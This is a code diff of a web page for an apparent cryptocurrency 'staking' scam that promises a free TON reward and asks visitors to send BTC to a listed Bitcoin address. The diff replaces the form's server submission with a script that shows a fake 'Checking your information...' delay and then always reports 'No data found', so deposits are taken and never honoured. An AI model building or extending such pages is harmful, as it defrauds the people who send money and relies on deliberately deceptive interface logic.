@@ -188,29 +188,35 @@
             width: 100%;
             z-index: 1000;
         }
+
+        /* New loading message */
+        .loading-message {
+            font-size: 1.5em;
+            color: #f39c12;
+            margin-top: 20px;
+        }
+
+        /* Error message styling */
+        .error-message {
+            font-size: 1.5em;
+            color: #e74c3c;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
-    <!-- New message for depositing via BTC 
-    <div class="top-message">
-        Deposit using BTC by clicking here!
-    </div>
--->
     <h1>Register - Start Staking</h1>
     <h2>Get your free reward of 1.99 TON</h2>
     <div class="container">
         <div class="qr-section">
-            
             <h2 class="section-title">Step 1: Deposit BTC</h2>
-           <!--- <h3>Now you can also deposit via BTC. Click here to continue with BTC.</h3> -->
             <div class="section-content">
                 <p>To get started, scan the QR code below or copy the transaction code to make your deposit using BTC coins.</p>
                 <P>To  Deposit by TON <a href="register.html">Click Here.</a></P>
-                <img src="btc.jpeg" alt="Scan QR Code for Deposit">
+                <img src="BTC.jpeg" alt="Scan QR Code for Deposit">
                 <p>Or send to the following transaction address:</p>
                 <div class="transaction-code" id="transactionCode">1CKmG1aKGyobeBVdVRyaqNAcCvRWxJGH7S</div>
-                <!-- Using Font Awesome copy icon for the button -->
                 <button class="copy-button" onclick="copyTransactionCode()">
                     <i class="fas fa-clipboard"></i>
                 </button>
@@ -219,7 +225,7 @@
 
         <div class="input-group">
             <h2 class="section-title">Step 2: Enter Your Details</h2>
-            <form action="submit_registration.php" method="post">
+            <form id="registrationForm">
                 <div class="input-group">
                     <label for="userID">Your ID (After Transaction):</label>
                     <input type="text" id="userID" name="userID" required>
@@ -234,6 +240,8 @@
                 </div>
                 <input type="submit" value="Submit">
             </form>
+            <div id="loadingMessage" class="loading-message" style="display: none;">Checking your information...</div>
+            <div id="errorMessage" class="error-message" style="display: none;">No data found. Please check your transaction ID.</div>
         </div>
 
         <div class="trustworthiness">
@@ -258,6 +266,21 @@
                 console.error("Error copying text: ", error);
             });
         }
+
+        document.getElementById("registrationForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Show the loading message
+            document.getElementById("loadingMessage").style.display = "block";
+            document.getElementById("errorMessage").style.display = "none";
+
+            // Simulate a delay (e.g., checking transaction ID)
+            setTimeout(function() {
+                // Hide the loading message and show the error message
+                document.getElementById("loadingMessage").style.display = "none";
+                document.getElementById("errorMessage").style.display = "block";
+            }, 2000); // 2 seconds delay
+        });
     </script>
 
 </body>
